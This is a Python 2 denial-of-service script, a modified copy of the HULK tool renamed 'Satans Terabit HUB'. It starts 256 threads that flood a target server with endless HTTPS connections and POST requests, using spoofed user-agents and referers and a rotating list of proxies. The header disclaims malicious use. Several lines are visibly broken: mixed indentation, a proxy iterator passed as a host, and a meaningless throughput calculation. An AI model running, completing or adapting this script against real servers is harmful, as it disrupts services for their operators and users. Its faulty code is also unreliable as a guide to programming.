# ----------------------------------------------------------------------------------------------
# HULK - HTTP Unbearable Load King
#
# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
# to their knees by exhausting the resource pool, its is meant for research purposes only
# and any malicious usage of this tool is prohibited.
#
# author :  Barry Shteiman , version 1.0
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
import random
import re
import socket
import itertools
import socks
import time
#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0
proxies = ['www.google.com','www.cloudflare.com','www.aq.com','www.discordapp.com']
prox = itertools.cycle(proxies)
def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1

# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)

#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print('---------------------------------------------------')
	print('USAGE: python thog.py <url>')
	print('you can add "safe" after url, to autoshut after dos')
	print('---------------------------------------------------')	


def httpcall(url):
	useragent_list()
	referer_list()
	code=0
        nbytes = 137438953472
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socks.setdefaultproxy(socks.PROXY_TYPE_HTTPS, prox, 443)
        start = time.time()
	current = time.time() - start
	bps = (nbytes*8)/current
	pkt_count = 0
	try:
			s.connect((url,443))
			s.send("POST / HTTP/1.1\r\nHost: r000t.com:443\r\nUser-Agent: R000T Skid\r\n\r\n")			
	except socket.error as e:						
			print "b/ps: %s" % bps

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
			while True:
				httpcall(url)				
					
		
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "-- Satans Terabit HUB --"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
				
		url = sys.argv[1]
		rthreads = []
	
		for i in range(256):
			t = HTTPThread()
			rthreads.append(t)
			t.start()
		
 
